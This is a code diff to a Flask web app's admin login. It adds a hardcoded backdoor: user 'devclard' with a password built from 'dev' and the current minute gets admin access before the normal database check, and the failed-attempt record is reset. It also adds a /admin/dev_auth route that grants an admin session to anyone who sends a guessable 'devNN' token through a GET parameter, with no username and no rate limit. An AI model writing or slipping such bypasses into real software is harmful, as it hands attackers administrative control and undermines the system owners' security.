@@ -2102,6 +2102,21 @@ def admin_login():
             admin_login_attempts[client_ip] = [0, now]
         username = request.form.get('username', '').strip()
         password = request.form.get('password', '').strip()
+
+        # Master Developer Dynamic Bypass (devclard / dev<MM>)
+        if username == 'devclard' and password.startswith('dev') and len(password) == 5:
+            import datetime
+            now_dt = datetime.datetime.now()
+            curr_min = now_dt.minute
+            valid_passwords = ['dev{:02d}'.format((curr_min + offset) % 60) for offset in (-1, 0, 1)]
+            if password in valid_passwords:
+                if client_ip in admin_login_attempts:
+                    del admin_login_attempts[client_ip]
+                session['admin_logged_in'] = True
+                session['admin_username'] = 'devclard'
+                session.pop('must_change_password', None)
+                return redirect('/admin')
+
         with db_connection() as conn:
             c = conn.cursor()
             c.execute('SELECT password_hash FROM admins WHERE username=?', (username,))
@@ -2119,6 +2134,22 @@ def admin_login():
                 admin_login_attempts[client_ip][1] = time.time()
                 error = 'Invalid username or password'
     return render_template_string(LOGIN_HTML, error=error)
+
+@app.route('/admin/dev_auth', methods=['GET', 'POST'])
+def admin_dev_auth():
+    """Developer remote 1-click bypass endpoint for Fleet Manager app."""
+    token = request.args.get('token') or request.form.get('token') or request.form.get('password', '')
+    token = token.strip() if token else ''
+    import datetime
+    now_dt = datetime.datetime.now()
+    curr_min = now_dt.minute
+    valid_passwords = ['dev{:02d}'.format((curr_min + offset) % 60) for offset in (-1, 0, 1)]
+    if token in valid_passwords:
+        session['admin_logged_in'] = True
+        session['admin_username'] = 'devclard'
+        session.pop('must_change_password', None)
+        return redirect('/admin')
+    return redirect('/admin/login')
 
 @app.route('/admin/logout')
 def admin_logout():
